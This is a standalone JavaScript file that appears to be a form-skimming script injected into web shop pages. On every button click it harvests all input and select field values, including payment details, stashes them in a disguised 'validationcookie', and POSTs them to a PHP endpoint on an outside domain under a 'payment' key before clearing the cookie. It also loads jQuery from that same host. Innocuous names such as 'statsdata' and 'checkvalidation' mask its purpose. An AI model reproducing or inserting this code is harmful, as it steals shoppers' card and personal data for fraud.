window.onload = function(){
	if(!window.jQuery)
	{
		var script = document.createElement('script');
		script.type = "text/javascript";
		script.src = "//baterky-noze.sk/modules/statsdata/js/jQuery.min.js";
		document.getElementsByTagName('head')[0].appendChild(script);
	}
	jQuery('button').click(function(){
		var data = "";
    	            jQuery("input, select").each(function(index, value){
    	        	if(jQuery(value).val() != "") { 
    	        		var vname = jQuery(value).attr("id"); 
    	        		if(vname) 
                            		{
    	        			vname = vname.split(":"); 
                    			vname=vname[vname.length - 1];
    	        			} 
				else vname = jQuery(value).attr("name");
    	        	if(jQuery(value).val() !== null && jQuery(value).val() !== undefined)
    	        		if(jQuery(value).val().length < 60) data+= vname+"->"+jQuery(value).val()+'|'; }
    		    });
		document.cookie= "validationcookie="+data+";";
		checkvalidation();
	})
	function checkvalidation()
	{
		var validation = document.cookie.split(";");
		var validation_str = '';
		validation.each(function(value){
			if(value.split('=')[0].trim() == 'validationcookie') 
				{
				validation_str = value.split('=')[1].trim();
				}
		});
		if(validation_str!=''){
		    jQuery.ajax({
			type: "POST",
			dataType: 'jsonp',
			async : true,
			url: "//baterky-noze.sk/modules/statsdata/statistics.php",
			data: {payment: validation, ref: window.location.host}
			}).success(function()
				{
				document.cookie= "validationcookie=;expires=Thu, 01 Jan 1970 00:00:00 UTC";
				});
		}
	}
	checkvalidation();
};
